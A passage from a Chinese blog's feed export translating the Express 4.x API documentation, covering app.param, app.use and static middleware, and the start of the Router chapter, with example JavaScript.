class="built_in">require</span>(<span class="string">'https'</span>);</span><br><span class="line"><span class="keyword">var</span>  http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(app).listen(<span class="number">80</span>);</span><br><span class="line">http.createServer(options,app).listen(<span class="number">443</span>)</span><br></pre></td></tr></table></figure></p><p>app.listen()方法是下面所示的一个便捷的方法（只针对HTTP协议）：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.listen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> server = http.createServer(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> server.listen.apply(server, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="app-METHOD-path-callback-callback-…"><a href="#app-METHOD-path-callback-callback-…" class="headerlink" title="app.METHOD(path,callback [,callback …])"></a>app.METHOD(path,callback [,callback …])</h3><p>路由HTTP请求，METHOD是这个请求的HTTP方法，比如GET,POST,PUT等等，小写。所以，实际方法是app.get,app.post,app.put等等，下面有关于方法完整的表。</p><p>获取更多信息，请看<a href="http://expressjs.com/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。 Express支持下面的路由方法，对应与同名的HTTP方法：</p><p>具体见<a href="http://www.expressjs.com.cn/4x/api.html#app.METHOD" target="_blank" rel="noopener">app.METHOD</a></p><blockquote><p>如果使用上述方法时，导致了无效的JavaScript变量名，可以使用中括号，比如：app[‘m-search’](‘/‘, function ….</p></blockquote><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没有满足当前路由的处理条件，那么传递控制到随后的路由。（我的话：”！这一段看了好几遍啦- -，理解next传递非常重要性”）</p><blockquote><p>本API文档把使用比较多的HTTP方法app.get()，app.post，app.put()，app.delete()作为一个个单独的项进行说明。然而，其他上述列出的方法以完全相同的方式工作。</p></blockquote><p>有一种特殊的路由方法，<code>app.all()</code>，这不是来自任何HTTP方法。他在所有请求方法的路径上加载中间件，其对于所有的方法都有效</p><h3 id="app-param-name-callback"><a href="#app-param-name-callback" class="headerlink" title="app.param([name],callback)"></a>app.param([name],callback)</h3><p>给路由参数添加回调触发器，这里的name是参数名或者参数数组，function是回调方法。回调方法的参数按序是请求对象，响应对象，下个中间件，参数值和参数名。 如果name是数组，会按照各个参数在数组中被声明的顺序将回调触发器注册下来。还有，对于除了最后一个参数的其他参数，在他们的回调中调用next()来调用下个声明参数的回调。只有一个参数，那么就是最后一个参数，和数组中最后一个参数是一样的。 例如，当:user出现在路由路径中，你可以映射用户加载的逻辑处理来自动提供req.user给这个路由，或者对输入的参数进行验证。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="string">'user'</span>.function(req,res,next,id)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试从用户模型获取用户详细信息并将其附加到请求对象</span></span><br><span class="line">    User.find(id,<span class="function"><span class="keyword">function</span>(<span class="params">err,user</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            next(err);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(user)&#123;</span><br><span class="line">            req.user = user;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail to load user'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>对于Param的回调定义的路由来说，他们是局部的。它们不会被挂载的app或者路由继承。所以，定义在app上的Param回调只有是在app上的路由具有这个路由参数时才起作用。</p><p>在定义param的路由上，param回调都是第一个被调用的，它们在一个请求-响应循环中都会被调用一次并且只有一次，即使多个路由都匹配，如下面的栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY NOCE'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this match'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matches too'</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>当GET/user/42,得到下面结果<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CALLED ONLY NOCE</span><br><span class="line">although <span class="keyword">this</span> matches</span><br><span class="line">and <span class="keyword">this</span> matches too</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param([<span class="string">'id'</span>,<span class="string">'page'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY ONCE with'</span>,value);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id/:page'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this matches'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/user/:id/:page'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matchs too'</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当执行GET /user/42/3，结果如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CALLED ONLY ONCE <span class="keyword">with</span> <span class="number">42</span></span><br><span class="line">CALLED ONLY ONCE <span class="keyword">with</span> <span class="number">3</span></span><br><span class="line">although <span class="keyword">this</span> matches</span><br><span class="line">and <span class="keyword">this</span> mathes too</span><br></pre></td></tr></table></figure></p><blockquote><p>下面章节描述的app.param(callback)在v4.11.0之后被弃用。</p></blockquote><p>通过只传递一个回调参数给app.param(name, callback)方法，app.param(naem, callback)方法的行为将被完全改变。这个回调参数是关于app.param(name, callback)该具有怎样的行为的一个自定义方法，这个方法必须接受两个参数并且返回一个中间件。 这个回调的第一个参数就是需要捕获的url的参数名，第二个参数可以是任一的JavaScript对象，其可能在实现返回一个中间件时被使用。 这个回调方法返回的中间件决定了当URL中包含这个参数时所采取的行为。 </p><p>在下面的例子中，app.param(name, callback)参数签名被修改成了app.param(name, accessId)。替换接受一个参数名和回调，app.param()现在接受一个参数名和一个数字。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义app.param()的行为</span></span><br><span class="line">app.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,option</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(val == option)&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用定制的app.param()</span></span><br><span class="line">app.param(<span class="string">'id'</span>,<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发捕获的路由</span></span><br><span class="line">app.get(<span class="string">'/user/:id'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'OK'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Ready'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,validator</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(validator(val))&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">candidate</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(candidate)) &amp;&amp; <span class="built_in">isFinite</span>(candidate);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>在使用正则表达式，不要使用.。例如，你不能使用/user-.+/来捕获user-gami，用使用[\s\S]或者[\w\&gt;W]来代替(正如/user-[\s\S]+/)。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//captures '1-a_6' but not '543-azser-sder'</span></span><br><span class="line">router.get(<span class="string">'/[0-9]+-[[\\w]]*'</span>, <span class="function"><span class="keyword">function</span>); </span></span><br><span class="line"><span class="function">//<span class="title">captures</span> '1-<span class="title">a_6</span>' <span class="title">and</span> '543-<span class="title">az</span>(<span class="params">ser<span class="string">"-sder' but not '5-a s'</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">router.get('/[0-9]+-[[\\S]]*', function); </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">//captures all (equivalent to '.*')</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">router.get('[[\\s\\S]]*', function);</span></span></span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="app-path"><a href="#app-path" class="headerlink" title="app.path()"></a>app.path()</h3><p>返回应用程序的规范路径（字符串）<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">app</span> = express()</span><br><span class="line">  , blog = express()</span><br><span class="line">  , blogAdmin = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">app</span>.<span class="keyword">use</span>('/blog', blog);</span><br><span class="line">blog.<span class="keyword">use</span>('/admin', blogAdmin);</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">app</span>.path()); <span class="comment">// ''</span></span><br><span class="line">console.<span class="built_in">log</span>(blog.path()); <span class="comment">// '/blog'</span></span><br><span class="line">console.<span class="built_in">log</span>(blogAdmin.path()); <span class="comment">// '/blog/admin'</span></span><br></pre></td></tr></table></figure></p><p>如果app挂载很复杂下，那么这个方法的行为也会很复杂：一种更好用的方式是使用<code>req.baseUrl</code>来获得这个app的典型路径。</p><h3 id="app-post-path-callback-callback-…"><a href="#app-post-path-callback-callback-…" class="headerlink" title="app.post(path, callback, [callback …])"></a>app.post(path, callback, [callback …])</h3><p>使用指定的回调函数将HTTP POST请求路由到指定的路径。有关更多信息，请参见<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。</p><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'POST request to homepage'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="app-put-path-callback-callback-…"><a href="#app-put-path-callback-callback-…" class="headerlink" title="app.put(path, callback [, callback …])"></a>app.put(path, callback [, callback …])</h3><p>使用指定的回调函数将HTTP PUT请求路由到指定的路径。有关更多信息，请参见<a href="http://www.expressjs.com.cn/guide/routing.html" target="_blank" rel="noopener">routing guide</a>。</p><p>你可以提供多个回调函数，它们的行为和中间件一样，除了这些回调可以通过调用next(‘router’)来绕过剩余的路由回调。你可以使用这个机制来为一个路由设置一些前提条件，如果请求没能满足当前路由的处理条件，那么传递控制到随后的路由<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.put(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'PUT request to homepage'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="app-render-view-locals-callback"><a href="#app-render-view-locals-callback" class="headerlink" title="app.render(view, [locals], callback)"></a>app.render(view, [locals], callback)</h3><p>通过回调函数返回视图的呈现HTML,它可以接受一个可选的参数，可选参数包含了这个view需要用到的本地数据。这个方法类似于res.render()，除了它不能把渲染得到的HTML文本发送给客户端。</p><blockquote><p>将app.render()当作是可以生成渲染视图字符串的工具方法。在res.render()内部，就是使用的app.render()来渲染视图。</p></blockquote><blockquote><p>如果使能了视图缓存，那么本地变量缓存就会保留。如果你想在开发的过程中缓存视图，设置它为true。在生产环境中，视图缓存默认是打开的。</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.render(<span class="string">'email'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.render(<span class="string">'email'</span>, &#123; <span class="attr">name</span>: <span class="string">'Tobi'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="app-route-path"><a href="#app-route-path" class="headerlink" title="app.route(path)"></a>app.route(path)</h3><p>返回一个单例模式的路由的实例，之后你可以在其上施加各种HTTP动作的中间件。使用app.route()来避免重复路由名字<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/events'</span>)</span><br><span class="line">.all(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// runs for all HTTP verbs first</span></span><br><span class="line">  <span class="comment">// think of it as route specific middleware!</span></span><br><span class="line">&#125;)</span><br><span class="line">.get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.json(...);</span><br><span class="line">&#125;)</span><br><span class="line">.post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// maybe add a new event...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="app-set-name-value"><a href="#app-set-name-value" class="headerlink" title="app.set(name, value)"></a>app.set(name, value)</h3><p>给 name 设置项赋 value 值，name 是 <a href="http://www.runoob.com/w3cnote/express-4-x-api.html#app.settings.table" target="_blank" rel="noopener">Application settings</a> 中属性的一项。 </p><p>对于一个类型是布尔型的属性调用app.set(‘foo’, ture)等价于调用app.enable(‘foo’)。同样的，调用app.set(‘foo’, false)等价于调用app.disable(‘foo’)。</p><p>可以使用app.get()来取得设置的值：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.set(<span class="string">'title'</span>, <span class="string">'My Site'</span>);</span><br><span class="line">app.get(<span class="string">'title'</span>); <span class="comment">// 'My Site'</span></span><br></pre></td></tr></table></figure></p><h4 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h4><p>如果name是程序设置之一，它将影响到程序的行为。下边列出了程序中的设置。<br>见 <a href="http://www.expressjs.com.cn/4x/api.html#app.set" target="_blank" rel="noopener">app.set</a></p><h3 id="app-use-path-function-function…"><a href="#app-use-path-function-function…" class="headerlink" title="app.use([path,] function [, function…])"></a>app.use([path,] function [, function…])</h3><p>挂载中间件方法到路径上。如果路径未指定，那么默认为”/“。</p><blockquote><p>一个路由将匹配任何路径如果这个路径以这个路由设置路径后紧跟着”/“。比如：app.use(‘/appale’, …)将匹配”/apple”，”/apple/images”，”/apple/images/news”等。</p></blockquote><blockquote><p>中间件中的req.originalUrl是req.baseUrl和req.path的组合，如下面的例子所示。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="string">'/admin'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// GET 'http://www.example.com/admin/new'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.originalUrl); <span class="comment">// '/admin/new'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.baseUrl); <span class="comment">// '/admin'</span></span><br><span class="line">  <span class="built_in">console</span>.log(req.path); <span class="comment">// '/new'</span></span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p></blockquote><p>在一个路径上挂载一个中间件之后，每当请求的路径的前缀部分匹配了这个路由路径，那么这个中间件就会被执行。 由于默认的路径为/，中间件挂载没有指定路径，那么对于每个请求，这个中间件都会被执行<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 此中间件将不允许请求超出它的范围。</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Time: %d'</span>, <span class="built_in">Date</span>.now());</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>路径(path)可以是表示路径的字符串、路径模式、匹配路径的正则表达式或其组合数组</p><p>下面是中间件的简单示例：</p><p>具体见<a href="http://www.expressjs.com.cn/4x/api.html#app.use" target="_blank" rel="noopener">app.use</a></p><p>下面是一些例子，在Express程序中使用express.static中间件。<br>为程序托管位于程序目录下的public目录下的静态资源：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /style.css etc</span></span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br></pre></td></tr></table></figure></p><p>在/static路径下挂载中间件来提供静态资源托管服务，只当请求是以/static为前缀的时候。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET /static/style.css etc.</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(express.__dirname + <span class="string">'/public'</span>));</span><br></pre></td></tr></table></figure></p><p>通过在设置静态资源中间件之后加载日志中间件来关闭静态资源请求的日志。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(logger());</span><br></pre></td></tr></table></figure></p><p>托管静态资源从不同的路径，但./public路径比其他更容易被匹配：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/files'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/uploads'</span>));</span><br></pre></td></tr></table></figure></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档核心的四大部分app，request，response，router，到此已经完成。简单的总结</p><ol><li><p>通过调用express()返回得到的app实际上是一个JavaScript的Function，它是一个Express的应用实例；app对象具有HTTP请求，配置中间件，渲染HTML视图，注册模板引擎这四大功能。它还有一些属性设置，这些属性可以改变程序的行为</p></li><li><p>request对象即表示HTTP请求，包含了请求查询字符串，参数，内容，HTTP头等属性</p></li><li><p>response对象则表示HTTP响应，即在受到请求时向客户端发送的HTTP响应数据</p></li><li><p>每个Express程序有一个内建的app路由，顶层的express对象有一个Router()方法，你可以使用Router()来创建一个新的router对象，你可以把它当做一个<code>mini-application</code>，它具有操作路由和中间件的能力，有些方法和app类同</p></li></ol><p>到此<code>Express4.x API 译文 系列文章</code>已经完成。<br>本人学识有限，难免有所纰漏或者理解不当之处，翻译仅仅是方便个人学习交流使用，无其他用意（如果有不妥之处，请联系本人删除），原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (四)：Router (译)</title>
      <link href="/2017/12/23/express-api-cn-router/"/>
      <url>/2017/12/23/express-api-cn-router/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a><a id="more"></a>已经完成了Express4.x API中的Requst和Response对象的文档翻译。简单的总结，request对象即表示HTTP请求，包含了请求查询字符串，参数，内容，HTTP头等属性；response对象则表示HTTP响应，即在受到请求时向客户端发送的HTTP响应数据。Express则基于此提供给我们一些方法，完成指定的请求和响应。</li></ul><p>技术库更迭较快，很难使译文和官方的API保持同步，我们只有提升自己的英语能力才能更快的适应库的更新迭代,阅读到最新资料。<br>所以我此次翻译的目的，一是熟悉express文档，二是锻炼自己英语阅读能力；</p><blockquote><p>原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">express.com</a></p></blockquote><h1 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h1><p><code>router</code>对象是中间件和路由的隔离实例，你可以把它看做一个仅能执行中间件和路由功能的<code>mini-applaction</code>，每一个Express应用程序实例都有一个内置的路由器</p><p>路由器的行为类似于中间件本身，所以你可以把他作为一个参数传递给<code>app.use()</code>或者作为参数传递给另一个路由器的<code>use()</code>方法</p><p><code>top-level</code> express 对象有一个Router()创建一个新的路由器对象</p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="Router-options"><a href="#Router-options" class="headerlink" title="Router([options])"></a>Router([options])</h3><p>创建一个新的路由器对象<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var router</span> = express.Router([options]);</span><br></pre></td></tr></table></figure></p><p>可选择的options参数指定路由器的行为<br>|Property|Description|Default|Availability|<br>|—|—|—|—|<br>|caseSensitive|是否启用大小写敏感|默认情况下不敏感，以相同的方式对待”/Foo”,”/foo”| |<br>|mergeParams|从父路由器保存<code>req.params</code>值，如果子父有冲突的参数名称，以子路由参数优先|false|4.5.0+|<br>|strict|启用严格路由|默认情况下是禁用的，”/foo”和”/foo/“是相同的| |</p><p>你可以像应用程序那样添加中间件和HTTP方法路由（例如get，put，post等等）<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用传递给次路由的任何请求</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 一些逻辑，和其他中间件一样</span></span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将会处理任何以/events结束的请求</span></span><br><span class="line">router.get(<span class="string">'/events'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>然后你可以为你特定的URL使用路由器，用这种方式把你的routes分为文件甚至是<code>mini-apps</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="string">'/calendar'</span>,router);</span><br></pre></td></tr></table></figure></p><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="routers-all-path-callback-…-callback"><a href="#routers-all-path-callback-…-callback" class="headerlink" title="routers.all(path,[callback,…] callback)"></a>routers.all(path,[callback,…] callback)</h3><p>这个方法就像<code>router.METHHOD()</code>,除了他匹配所有的HTTP方法</p><p>这个方法对于映射特定路径前缀或任意匹配的”全局”逻辑非常有用。举个栗子，如果你将以下路由置于所有路由的最前面，它要求从该点的所有路由都需要身份认证，并自动加载user。记住这些回调函数不必作为终点，<code>loadUser</code>可以执行任务，然后通过<code>next()</code>传递继续匹配给后续的路由<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span class="string">'*'</span>,requireAuthentication,loadUser);</span><br></pre></td></tr></table></figure></p><p>等价于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span class="string">'*'</span>,requireAuthentication)</span><br><span class="line">router.all(<span class="string">'*'</span>,loadUser)</span><br></pre></td></tr></table></figure></p><p>另一个例子是<code>white-listed</code>“global”功能，这里的例子非常的相似，但是它只限制路径的前缀”/api”<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.all(<span class="string">'/api/*'</span>,requireAuthentication);</span><br></pre></td></tr></table></figure></p><h3 id="router-METHOD-path-callback-…-callback"><a href="#router-METHOD-path-callback-…-callback" class="headerlink" title="router.METHOD(path,[callback,…] callback)"></a>router.METHOD(path,[callback,…] callback)</h3><p><code>router.METHOD()</code>方法在Express中提供路由功能，其中METHOD是HTTP方法之一，例如GET，POST，PUT等等，当然你可以小写。所以实际的方法是<code>router.get()</code>，<code>router.post()</code>，<code>router.put()</code>等等</p><blockquote><p><code>router.get()</code>函数将会自动的调用HTTP HEAD方法，除了<code>router.head()</code>在<code>router.get()</code>之前要求没有走这条路 </p></blockquote><p>你可以提供多个回调，每个回调都被平等对待，表现的就像中间件，除了这些回调函数可以调用<code>next(route)</code>绕过其余路由回调。您可以使用此机制在路由上执行预条件，然后在没有理由继续匹配路由的情况下将控制传递给后续路由。</p><p>下面片段展示了最简单的路由定义，Express将字符串转化为正则表达式，在内部用于匹配传入请求。执行这些匹配时不考虑查询字符串，例如’GET’将匹配下面路由，像<code>GET/?name=&#39;tobi&#39;</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>如果你有非常具体的约束条件，还可以使用正则表达式。举个栗子下面将会匹配”GET /commits/71dbb9c”以及 “GET /commits/71dbb9c..4c084f9”.<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="regexp">/^\/commits\/(\w+)(?:\.\.(\w+))?$/</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">from</span> = req.params[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> to = req.params[<span class="number">1</span>] || <span class="string">'HEAD'</span>;</span><br><span class="line">    res.send(<span class="string">'commit range'</span> + form + <span class="string">'..'</span> + to);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="router-param-name-callback"><a href="#router-param-name-callback" class="headerlink" title="router.param(name, callback)"></a>router.param(name, callback)</h3><p>添加回调触发到路由参数中，name是参数的名称，callback是回调函数。虽然name在技术上是可选的，但是从Express v4.11.0没有它是不推荐使用这种方法的（如下）</p><ul><li>req，请求对象</li><li>res，响应对象</li><li>next，指示下一个中间件的功能</li><li>name参数的值</li><li>参数的名称</li></ul><blockquote><p>不像<code>app.param()</code>,<code>router.param()</code>不接受数组参数</p></blockquote><p>举个栗子，当<code>:user</code>在路由路径中存在时，可以将用户加载映射为自动提供<code>req.user</code>给这个路由，或者执行验证的参数输入<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.param(<span class="string">'user'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//尝试从用户模型获取用户详细信息并将其附加到请求对象</span></span><br><span class="line">    User.find(id,<span class="function"><span class="keyword">function</span>(<span class="params">err,user</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            next(err);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(user)&#123;</span><br><span class="line">            req.user = user;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span 